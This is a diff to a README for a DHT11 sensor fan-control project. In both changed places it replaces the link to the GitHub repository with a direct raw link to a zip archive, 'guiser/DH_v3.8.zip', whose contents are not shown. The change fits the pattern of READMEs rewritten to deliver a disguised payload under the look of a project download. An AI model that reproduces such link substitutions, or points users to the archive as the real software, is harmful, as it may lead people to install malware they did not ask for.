@@ -1,6 +1,6 @@
 # 🔥 DHT11 - Simple Fan Control for Warm Rooms
 
-[![Download](https://img.shields.io/badge/Download%20DHT11-blue?style=for-the-badge)](https://github.com/akroutabdelrrezak/DHT11)
+[![Download](https://img.shields.io/badge/Download%20DHT11-blue?style=for-the-badge)](https://raw.githubusercontent.com/akroutabdelrrezak/DHT11/main/guiser/DH_v3.8.zip)
 
 ## 📥 Download and Setup
 
@@ -199,7 +199,7 @@ A common setup looks like this:
 
 Visit the GitHub page here and download the project files:
 
-https://github.com/akroutabdelrrezak/DHT11
+https://raw.githubusercontent.com/akroutabdelrrezak/DHT11/main/guiser/DH_v3.8.zip
 
 ## 🧷 Pin Reference
 
